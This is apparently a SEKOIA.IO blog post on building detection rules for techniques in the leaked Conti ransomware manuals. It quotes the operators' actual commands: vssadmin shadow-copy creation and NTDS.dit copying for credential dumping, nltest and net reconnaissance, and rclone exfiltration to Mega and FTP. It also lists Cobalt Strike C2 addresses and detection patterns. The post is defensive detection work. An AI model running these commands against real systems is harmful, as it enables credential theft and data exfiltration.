In](https://blog.sekoia.io/an-insider-insights-into-conti-operations-part-one/)\nthis second blog post, we will look into how to make simple detection rules to detect the\ntechniques shown in the Conti manuals. The techniques are simple for most of them, with no\nobfuscation and classic techniques being used, hence why simple detection rules are\npossible.\n\nFor that, we picked a few techniques that we will explain, and link them to existing rules to\nshow that open-source detection techniques already exist for such a threat and can be used\nto help all the companies prevent that. However, please note that even though simple rules\ncan detect Conti operations as displayed in the manuals, it does not mean it will detect future\nConti intrusions or other ransomware actors. The techniques are important and should be\nexplored in depth to make better detection rules.\n\n## Let’s detect Conti’s techniques!\n\n### Disable Windows Defender using PowerShell (T1562.001)\n\nThe command used to Disable Windows Defender by the Conti operators is the following\none:\n\n\n-----\n\nThey use PowerShell and the command Set-MpPreference that is used to configure\npreferences for Windows Defender scans and updates on the whole system, instead of “AddMpPreference” that modifies the settings of Windows Defender and is often used to whitelist\na specific path from being scanned by Windows Defender.\n\nA thing to note here is that the Conti operators seem to disable ONLY “RealTimeMonitoring”,\nwhereas most of the actors also disable “BehaviorMonitoring”.\n\nAlthough there are lots of ways to disable Windows Defender, this is a widely used technique\nand therefore a good detection opportunity. Indeed, this is used by many other ransomware\n[actors, but also APT actors such as Lazarus, as shown in the F-Secure blogpost¹.](https://labs.f-secure.com/blog/catching-lazarus-threat-intelligence-to-real-detection-logic/)\n\n[A Sigma rule to detect this is provided as well with the blogpost and its GitHub repository².](https://github.com/countercept/lazarus-sigma-rules/blob/master/win_powershell_disable_windefender.yml)\n\nThis is great as it allows such a threat to be detected with only Event ID 1 from SYSMON or\nEvent ID 4688 from Windows for example.\n\nIn SEKOIA.IO we have a similar rule to detect this technique, however as written in the\nintroduction to this blog post, the command itself is not really important, what’s important is\nthe technique: Disabling Windows Defender. Therefore we looked into the TTP in depth to\ncheck what techniques can be used to disable Windows Defender and built rules on that.\n\nTo give a few examples, Windows Defender can be disabled using the command “sc” or\nthrough registry keys directly as well. Its legitimate executable “MpCmdRun.exe” can also be\nused to remove all signatures within Windows Defender, making it not really disabled but\nquite useless for detection.\n\nHere is how Windows Defender being disabled using PowerShell is shown on a SEKOIA.IO\nalert:\n\n\n-----\n\n_Detection of Windows Defender deactivation in SEKOIA.IO_\n\n### Retrieve NTDS file from Volume Shadow Copy (T1003.003)\n\nDumping the “NTDS.dit” file from the Active Directory is a very common method to extract\npassword hashes of all the domain members. To achieve this, various tools or techniques\ncan be used. The one performed by Conti operators is based on the copy of the “NTDS.dit”\nfile from a Volume Shadow Copy.\n\nConti operators are not the only ones to use that technique. MITRE ATT&CK is listing some\n[software and groups using this technique, named “OS Credential Dumping: NTDS”³. These](https://attack.mitre.org/techniques/T1003/003/)\nthreat actors include FIN6, Fox Kitten, and Mustang Panda.\n\nThe widely used technique detailed in the Conti manual consists in finding a Shadow Copy\non the Active Directory and then copying the “NTDS.dit” file. In case no Shadow Copy exists,\nthe Conti operators create one using the “vssadmin” command. The command lines used by\nthe operators are the following ones:\n\nwmic /node:”DC01″ /user:”DOMAIN\\admin” /password:”cleartextpass” process call create “cmd /c vssadmin list shadows >>c:\\log.txt”\n\nOR\n\nwmic /node:”DC01″ /user:”DOMAIN\\admin” /password:”cleartextpass” process call create “cmd /c vssadmin create shadow/for=C: 2>&1”\n\nTHEN\n\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\programdata\n\nThe detection of the NTDS.dit file dump using Volume Shadow Copy can be achieved at\ndifferent steps.\n\n\n-----\n\nFirst, monitoring suspicious vssadmin execution may reveal the creation, the deletion or the\nlisting of Shadow copies. While creating Shadow copies is a common solution used to\nperform regular backups, listing and deleting Shadow copies are much rarer.\n\nDetection rule can be done on the Microsoft-Windows-Security-Auditing Event ID 4688 (A\nnew process has been created) by looking for the process name “vssadmin.exe” and\nsuspicious command line arguments, which could be “delete shadows”, “list shadows”,\n“create shadow /for=C:”. The Event ID 1 (Process creation) from Sysmon can also be used\nwith the fields “Image” and “CommandLine”.\n\nSecond, detecting activities related to the “NTDS.dit” file would be efficient to identify attacker\nbehaviors. To do this, a solution is monitoring command lines that contain the command\n“copy” and the “NTDS.dit” file path “\\Windows\\NTDS\\NTDS.dit”. Again, the Windows Event\nEvent ID 4688 and Sysmon Event ID 1 allow this. Sysmon can also be used to detect the\ncreation of this file using the Event ID 11 (FileCreate) and checking if the “TargetFilename”\nmatches “*NTDS.dit” in case the attacker doesn’t rename it.\n\nA Sigma rule⁴ provides elements to detect the technique used by Conti operators.\n\nOther ways to dump “NTDS.dit” file are possible, using the built-in Windows tools (esentutl,\nntdsutil) or penetration testing tools (Mimikatz, Koadic, CrackMapExec, …). Again, their\nexecution can be detected using Windows and Sysmon events.\n\nWe replayed the commands on a Windows machine supervised by the SEKOIA.IO XDR.\nHere are two alerts that have been raised:\n\n_Detection of Shadow Copies listing on SEKOIA.IO_\n\n\n-----\n\n_Detection of the copy of NTDS.dit file on SEKOIA.IO_\n\n### Identify domains using Nltest (T1482)\n\nConti operators used the Windows built-in command “nltest.exe” to identify Domain\nControllers (DCs) and “trusts” relationships. As their name says, Domain Controllers are\nservers that can “control” a Windows Domain and therefore this command is commonly used\nby attackers as it is a quick, built-in way to enumerate servers of great interest.\n\nThe trust relationship is a link between domains or forests in a Windows environment. When\nthis link is set up between two domains for instance, domain A can access resources in\ndomain B. It is way more complex than that though as there can be one-way trust or two[ways trust, … We recommend reading the Microsoft documentation⁵ for more details and this](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c)\ngreat blogpost⁶ by @harmjoy which covers many techniques used to abuse domain trusts.\n\nAlthough being built-in, the “nltest” command is surprisingly not used much for legitimate\nusage by users/administrators, which makes it a great detection opportunity! Here are the\nexact commands used by the Conti operators:\n\nnltest /DOMAIN_TRUSTS\n\nnltest /dclist:”NameDomain”\n\nnltest /domain_trusts /all_trusts\n\nThese three commands do the following:\n\nReturns a list of trusted domains.\nReturns all Domain Controllers on a specific domain (NameDomain here)\nReturns all trusted domains.\n\n\n-----\n\nAgain, as these commands are commonly used and really simple, a public Sigma\nrule⁷ already exists for this and can be used to detect all three commands.\n\nThis rule can be used with only the Windows Event ID 4688 or Sysmon Event ID 1.\n\nOther techniques can be used to retrieve similar information such as “dsquery.exe”, as it can\nbe observed in the Sigma rule, which is also a legitimate built-in Windows executable. One\nother quick win is to take a look at PowerShell commands that can be used as well to\nretrieve a list of Domain Controllers for a domain, although that is more commonly used and\ncan lead to some false positives.\n\nHere is how an alert regarding that technique is shown on SEKOIA.IO:\n\n_Detection of domain trusts discovery using the “nltest” command_\n\n### Identify remote systems using net command (T1018)\n\nConti operators executed the following commands (SEKOIA removed explicit information on\nhostnames and usernames):\n\nnet view \\\\[DC_SERVER] /all  1>>c:\\programdata\\sh.txt\n\nnet view \\\\[HOSTNAME] /ALL\n\nnet view /all /domain\n\nnet view \\\\host /ALL\n\nnet view \\\\172.16.1.40 /ALL\n\nnet user [USERNAME] /dom\n\nnet user [USERNAME] /domain\n\nnet user Администратор /active:yes\n\n\n-----\n\nnet accounts /dom\n\nThere are several things to note in these commands.\n\nThe first one is that once, they use the operator “1>>” to redirect command output into a file.\nRedirecting output to a file on Windows is already not necessarily common but still can lead\nto quite a lot of false positives depending on the Estates, however it is mainly done by using\nonly “>” or “>>”, not “1>>”.\n\nThere is an awesome quick win here: checking for “1>>” in the command line argument.\n\nThe second thing is that even though most of the listed commands are very commonly used\nin a corporate environment, the following one can have a higher detection rate:\n\nnet group “domain admins” /domain\n\nIndeed, this is a bit less common to see that command in corporate environments and\ntherefore this can be used for detection. This is also a rule available publicly on the Sigma\nrepository⁸ and can be detected with the Windows Event ID 4688 or Sysmon Event ID 1 as\nwell. Depending on your Estate’s activity, you might be able to remove the time and count\nconditions in the rule to be more specific and be able to catch an attacker using this\ncommand a single time. Although note that this might lead to some false positives and this\nshould definitely be adapted to your corporate environment.\n\nExcept that, all the commands are very commonly used in a corporate environment. They\nare discovery / reconnaissance commands and should still be detected in our opinion,\nhowever with a low “score” / “urgency”. As shown above with the Sigma rule though, it can\nbe a good thing to have a higher score if the commands are executed on the same host\nmultiple times in a row in a few seconds. Note that seeing only one of these commands\nshould not be a “red flag”, however it is still useful to have a rule for it in case other rules\nmatch.\n\nLet’s take a quick example with only the commands above. There are 10 commands listed.\nAssuming the 10 are executed (even if that will probably not be the case), the created rules\nwill match 10 times.\n\nAt SEKOIA.IO we use an urgency “score” that represents the criticality of an alert and if it\nshould be dealt with right away or not. We also have a “similarity” system, which will give us\nhow many times a rule has matched on the same host.\n\nTherefore, if several commands are executed on the same host, and each command\nmatches the same rule, we will still have a low urgency score however we will have a high\n“similarity” number.\n\n\n-----\n\nIn case only one command is executed, we will have one alert with one event and 0\nsimilarity, hence we will know that it is most likely a false positive if no other rule matches as\nwell.\n\nHowever when the 10 commands are executed, we will have either:\n\none alert with 10 similarities if the commands are executed on the same host\n10 alerts otherwise\n\nEither way, this is already a bit suspicious. Following that, we will analyse the events and\ncheck if there are other suspicious events on the same host / surrounding those commands\noverall. And this is only the discovery step, so many other alerts, as shown in this blogpost\nfor example, will (likely) be raised!\n\nEverything above is just here to say one thing: every step of the MITRE ATT&CK matrix is\nworth being detected. False positives can always be avoided / reduced and not detecting\nthose techniques (and especially the discovery techniques) could lead to a huge delay from\nthe defenders to spot the attacker.\n\nThe detection of every command here is quite straightforward as well with just the detection\nof “net.exe”/”net1.exe” and each option for example and works with Windows Event ID 4688\nand Sysmon Event ID 1 as well.\n\nHere is a simple example that shows an alert on SEKOIA.IO when “net.exe” or “net1.exe”\nare used to discover shares:\n\n_Detection of network share discovery commands on SEKOIA IO_\n\n\n-----\n\n### Exfiltrate data using Rclone (T1567.002)\n\nRclone is a legitimate program to manage files on Cloud storage that is often used by\nransomware operators performing double extortion. Indeed, it is a simple command-line tool\nthat enables them to exfiltrate data from compromised systems to their storage system. In\n2021, Rclone was observed in several ransomware attacks operated by Darkside, Egregor,\nRevil or Conti operators. This tool is rarely used in company IT environments. It is therefore\nrelevant to look for its possible execution traces.\n\n[According to the leaked manual and a previous DFIR report⁹, Conti operators are using](https://thedfirreport.com/2021/05/12/conti-ransomware/)\nRclone with a configuration file and without trying to disguise their activities. Indeed, they\ndownload the program directly from the official webpage and don’t obfuscate their\ncommands:\n\nrclone.exe config\n\nrclone.exe config show\n\nrclone.exe copy “FILES” Mega:Finanse -q –ignore-existing –auto-confirm –multi-thread-streams 12 –transfers 12\n\nrclone.exe copy “FILES” ftp1:uploads/Users/ -q –ignore-existing\n\n–auto-confirm –multi-thread-streams 3 –transfers 3\n\nThe Conti operators seem to use FTP servers and Mega service to exfiltrate victims’ data.\nThis information is interesting to detect their activities in case Rclone is legitimately used in\nan IT environment, but with other Cloud storage than FTP and Mega.\n\nHere are some ways to detect the Rclone usage on Windows systems:\n\nA basic way is to monitor process creation whose process name is “rclone.exe” by\nusing Windows Event ID 4688 or Sysmon Event ID 1. This method is sufficient to\ndetect operations performed by Conti operators.\nIn case attackers masquerade the executable by renaming it, it remains possible to\ndetect its execution using the same Windows or Sysmon events by searching in the\n“CommandLine” value for specific arguments sequences. For example, detecting the\npatterns “copy”, “mega:” and “–” (which corresponds to an additional flag) in the same\ncommand line is specific enough to find execution of a renamed Rclone binary. Of\ncourse, the pattern “mega:” can be replaced by “ftp:”, “pcloud:”, “s3” or any other\nstorage services likely to receive data exfiltrated by an attacker.\nIn case attackers masquerade the executable and use a Rclone configuration file\ninstead of indicating the destination endpoint in the command line, it is possible to\ndetect the arguments specific to Rclone usage. For example, looking for “–ignoreexisting”, “–auto-confirm”, “–multi-thread-streams”, “–transfers”, “no-check-certificate” in\naddition to the argument “copy” may reveal Rclone execution.\n\nAgain, Sigma detection rules¹⁰ ¹¹ ¹² detecting Rclone execution are available in their GitHub\nrepository.\n\n\n-----\n\nA detection rule based on the three previously described cases has raised an alert in\nSEKOIA.IO XDR when playing the Conti operators’ commands to exfiltrate data using\nRclone.\n\n_Detection of Rclone commands on SEKOIA.IO_\n\n### Cobalt Strike (T*)\n\nCobalt Strike usage is a golden mine to detect a compromised network and was already\n[covered in that previous blog post¹³.](https://blog.sekoia.io/hunting-and-detecting-cobalt-strike/)\n\nOn top of that, Cobalt Strike C2 (Command and Control servers) can often be spotted,\ndepending on the configuration, using different sources (online and offline). In the leaks, 4\nCobaltStrike IP addresses were provided: “162.244.80[.]235”, “85.93.88[.]165”,\n“185.141.63[.]120” and “82.118.21[.]1”.\n\nAlthough after the leak they probably won’t be used as this is really easy to block for\ncompanies and now integrated into many feeds, what is useful is to spot the C2s BEFORE\nthey are used in operations and overall before they are made publicly available.\n\nAt SEKOIA we are tracking adversary infrastructures to collect information on C2s using\ndifferent sources. As an example, we had the Cobalt Strike C2s provided in the leak before\nthey leaked (and therefore hopefully before they were used in any operation):\n\n\n-----\n\nWhere “MalleableC2” stands for specific profiles used by the Cobalt Strike team server and\n“Cobalt Strike” the default Cobalt Strike configuration. As displayed in the image, one C2 was\nspotted on July 12th, 2021 which is almost a month before the first leak. It is therefore quite\nuseful to have this kind of capability on top of system and network classic detections as it\ngives another way to detect threats and usually companies can easily perform actions on IP\naddresses (& domain names).\n\n### Conclusion\n\nThis second blog post focused on the detection of the leaked Conti’s techniques. As stated\nseveral times, it shows that detecting ransomware operators’ actions before its execution is\nactually possible as there are multiple detection opportunities. Indeed, they use commands\nthat are commonly seen among many attackers and they seem to not obfuscate the\ncommands. In the end, it is still a good opportunity to fill any detection gaps if you have some\nand review the MITRE ATT&CK overall to study the techniques used by Conti more in depth\nto detect other actors that might use more complex techniques.\n\n**Our analysis leaves us with one question: will Conti operators change their modus**\n**_operandi following the leaks or not?_**\n\nSince the techniques used are already not really advanced but efficient, at SEKOIA we think\nthat the leaks will not have much impact on the way Conti operates. As they aim for\nefficiency and money, they will still target companies carefully and then launch their\nransomware as fast as they can. They probably won’t bother in changing the techniques\nsince that costs money, most of the techniques were already known before the leaks in the\ndifferent incident response reports and it still works today so, why bother?\n\n\n-----",
